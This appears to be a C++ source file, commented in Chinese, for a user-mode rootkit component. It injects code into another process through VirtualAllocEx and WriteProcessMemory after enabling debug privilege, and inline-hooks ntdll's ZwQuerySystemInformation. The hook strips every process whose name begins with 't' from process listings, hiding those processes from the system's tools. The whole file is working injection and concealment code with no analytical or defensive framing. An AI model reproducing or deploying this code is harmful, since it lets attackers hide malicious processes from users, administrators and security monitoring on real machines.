#include "ZwQuerySystemInformation.h"
#include <stdio.h>

extern "C" LONG(__stdcall *ZwQuerySystemInformation)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength, _Out_opt_ PULONG                   ReturnLength
	) = NULL;

__declspec (naked) VOID FunStart() {};//定义函数开始的位置 release版本 没用
__declspec (naked) VOID ZwQuerySystemInformationProxy()
{
	//这里备份五个字节就可以了的因为Zwxx的函数格式原因这里固定都是无个字节
	_asm {
		nop
		nop
		nop
		nop
		nop
		mov ebx, 0x88888888 //ZwQuerySystemInformation 方便特征定位
		jmp ebx
	}
}

NTSTATUS
NTAPI
HOOK_ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
)
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESSES pSystemProcesses = NULL, Prev;

	_asm {
		push ebx
		push ReturnLength
		push SystemInformationLength
		push SystemInformation
		push SystemInformationClass
		call ZwQuerySystemInformationProxy //让原来函数执行完成,只有这样函数才能返回我们需要的数据然后在数据里进行修改
		mov ntStatus, eax
		pop ebx
	}

	if (ntStatus != STATUS_INFO_LENGTH_MISMATCH && NT_SUCCESS(ntStatus) && SystemInformationClass == 5) {

		PSYSTEM_PROCESS_INFORMATION pCurr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION pPrev = NULL;

		while (pCurr)
		{
			LPWSTR pszProcessName = pCurr->ImageName.Buffer;
			if (pszProcessName != NULL)
			{
				bool find = true;
				for (int i = 0; i<pCurr->ImageName.Length&&i<1; i++) {
					if (*((char*)pszProcessName + i) == 't'|| *((char*)pszProcessName + i) == 'T') {
					}
					else
					{
						find = false;
						break;
					}
				}
				//if (0 == memcmp(pszProcessName, L"notepad.exe", pCurr->ImageName.Length>22 ? 22 : pCurr->ImageName.Length) || 0 == memcmp(pszProcessName, L"chrome.exe", pCurr->ImageName.Length>20 ? 20 : pCurr->ImageName.Length))
				if (find)
				{
					if (pPrev) // Middle or Last entry
					{
						if (pCurr->NextEntryOffset)
							pPrev->NextEntryOffset += pCurr->NextEntryOffset;
						else // we are last, so make prev the end
							pPrev->NextEntryOffset = 0;
					}
					else
					{
						if (pCurr->NextEntryOffset)
						{
							// we are first in the list, so move it forward
							SystemInformation = (UCHAR*)SystemInformation + pCurr->NextEntryOffset;
						}
						else // 唯一的进程
							SystemInformation = NULL;
					}
				}
				else
				{
					pPrev = pCurr;
				}
			}
			else
			{
				pPrev = pCurr;
			}
			if (pCurr->NextEntryOffset)
			{
				pCurr = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pCurr) + pCurr->NextEntryOffset);
			}
			else
			{
				pCurr = NULL;
			}

		}
	}
	return ntStatus;
}
__declspec (naked) VOID FunEnd() { _asm {nop} };//定义函数结束的位置

DWORD GetFunAddress(PUCHAR lpFunStart)
{
	DWORD dwFunAddress;
	if (*lpFunStart == 0xE9)
	{
		//在Debug版本里VC会做一个跳转
		dwFunAddress = (DWORD)lpFunStart + *(DWORD *)(lpFunStart + 1) + 5;
	}
	else
	{
		dwFunAddress = (DWORD)lpFunStart;
	}
	return dwFunAddress;
}

BOOLEAN _SetHook(DWORD dwProcessId)
{
	BOOLEAN bRet = FALSE;
	DWORD OldProtect;
	DWORD dwCodeStart, dwCodeEnd, dwCodeSize;
	BYTE HookCode[5] = { 0xE9,0,0,0,0 };
	HANDLE hProcess = NULL;
	PVOID RemoteAllocBase = NULL;
	DWORD dwFunAddress;
	PUCHAR pBuffer;

	dwCodeStart = GetFunAddress((PUCHAR)FunStart);
	dwCodeEnd = GetFunAddress((PUCHAR)FunEnd);
	dwCodeSize = dwCodeEnd - dwCodeStart;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION,
		FALSE,
		dwProcessId
	);

	if (hProcess) {
		HANDLE hToken;
		if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
			printf("Open Process Token Success!\n");
			TOKEN_PRIVILEGES tkp;
			LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL)) printf("ok\n");//通知系统修改进程权限
			//PRIVILEGE_SET RequiredPrivileges = { 0 };
			//RequiredPrivileges.Control = PRIVILEGE_SET_ALL_NECESSARY;
			//RequiredPrivileges.PrivilegeCount = 1;
			//RequiredPrivileges.Privilege[0].Luid = tkp.Privileges[0].Luid;
			//RequiredPrivileges.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
			//BOOL bResult = 0;
			//PrivilegeCheck(hToken, &RequiredPrivileges, &bResult);
			//if (bResult) printf("\n can debug");
		}
		else {
			printf("Open Process Token Fail!\n");
		}
		RemoteAllocBase = VirtualAllocEx(hProcess,
			NULL,
			dwCodeSize,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);
		if (RemoteAllocBase) {
			//printf("\t申请内存地址：0x%x\n", RemoteAllocBase);
			//g_lpRemoteAllocBase = RemoteAllocBase;
			if (ZwQuerySystemInformation) {
				bRet = VirtualProtect((PVOID)dwCodeStart,
					dwCodeSize,
					PAGE_EXECUTE_READWRITE,
					&OldProtect
				);
				if (bRet) {
					memcpy(ZwQuerySystemInformationProxy, ZwQuerySystemInformation, 5); //这里可以在本进程中取备份代码也可以在远程进程中取一般正常情况是一样的
																						//for (int i = 0; i < 50;i++) printf("\ndata %d is 0x%x\n",i, *(DWORD *)(dwCodeStart + i));
																						//*(DWORD *)(dwCodeStart + 22) = (DWORD)ZwQuerySystemInformation;//这里不需要用特征定位,因为肯定是在第六个字节开始的地方
					for (int i = 0; i < 50; i++) {
						if (0x88888888 == *(DWORD *)(dwCodeStart + i)) {
							*(DWORD *)(dwCodeStart + i) = (DWORD)ZwQuerySystemInformation + 5;
						}
						//printf("\ndata %d is 0x%x\n", i, *(DWORD *)(dwCodeStart + i));
					}
					*HookCode = 0xE9;
					dwFunAddress = GetFunAddress((PUCHAR)HOOK_ZwQuerySystemInformation);
					dwFunAddress -= dwCodeStart;
					dwFunAddress += (DWORD)RemoteAllocBase; //计算HOOK_ZwQuerySystemInformation在目标进程中的地址
					*(DWORD *)((char*)HookCode + 1) = (DWORD)dwFunAddress - 5 - (DWORD)ZwQuerySystemInformation;
					VirtualProtect((PVOID)dwCodeStart,
						dwCodeSize,
						PAGE_EXECUTE_READWRITE,
						&OldProtect
					);
				}
			}
			bRet = WriteProcessMemory(hProcess,
				RemoteAllocBase,
				(PVOID)dwCodeStart,
				dwCodeSize,
				NULL
			);
			if (bRet) {
				bRet = WriteProcessMemory(hProcess,
					ZwQuerySystemInformation,
					HookCode,
					5,
					NULL
				);
				if (!bRet) printf("fail to write ! error:%d", GetLastError());
				else
				{
					printf("Hook To PID=%d Success\n",dwProcessId);
				}
			}
		}
		else {
			printf("Cannot Alloc whith error code:%d", GetLastError());
		}
		CloseHandle(hProcess);
	}
	return bRet;
}

BOOLEAN SetHook(DWORD dwProcessId) {
	HINSTANCE   hNTDLL = ::GetModuleHandle(TEXT("ntdll"));

	(FARPROC&)ZwQuerySystemInformation =
		::GetProcAddress(hNTDLL, "ZwQuerySystemInformation");
	BOOLEAN res = _SetHook(dwProcessId);
	FreeLibrary(hNTDLL);
	return res;
}
